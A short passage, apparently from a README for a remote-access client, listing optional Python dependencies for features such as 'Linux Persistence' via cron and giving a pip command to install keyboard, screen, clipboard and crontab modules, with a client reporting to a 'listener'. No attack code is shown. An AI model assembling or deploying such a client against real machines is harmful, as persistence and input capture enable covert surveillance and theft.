| Linux Persistence      | `python-crontab`           | `pip install python-crontab`                     |
| Logging                | (built-in)                 |                                                  |

**Note:**
- If an optional module is missing, the client will log the error and notify the listener that the feature is unavailable.
- To use all features, install all optional modules.

**Install all optional dependencies at once:**
```bash
pip install cryptography pynput pyautogui pyperclip python-crontab
```

---
